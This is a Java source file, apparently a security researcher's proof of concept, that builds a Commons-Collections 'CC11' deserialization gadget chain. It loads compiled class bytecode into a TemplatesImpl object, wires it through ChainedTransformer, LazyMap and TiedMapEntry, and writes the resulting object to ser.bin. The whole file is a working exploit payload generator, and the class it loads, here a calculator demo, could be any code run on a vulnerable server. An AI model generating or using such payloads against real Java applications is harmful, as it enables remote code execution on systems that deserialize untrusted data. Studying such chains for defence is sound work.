import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC11EXP {
    public static void main(String[] args) throws Exception{
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"Drunkbaby");

        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] evil = Files.readAllBytes(Paths.get("E://Calc.class"));
        byte[][] codes = {evil};
        bytecodesField.set(templates,codes);

        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer", null, null)
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();
//        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
        Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer("five")); // 防止在反序列化前弹计算器
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");
        HashMap<Object, Object> expMap = new HashMap<>();
        expMap.put(tiedMapEntry, "value");
        lazyMap.remove("key");

        // 在 put 之后通过反射修改值
        Class<LazyMap> lazyMapClass = LazyMap.class;
        Field factoryField = lazyMapClass.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap, chainedTransformer);

        serialize(expMap);
       // unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
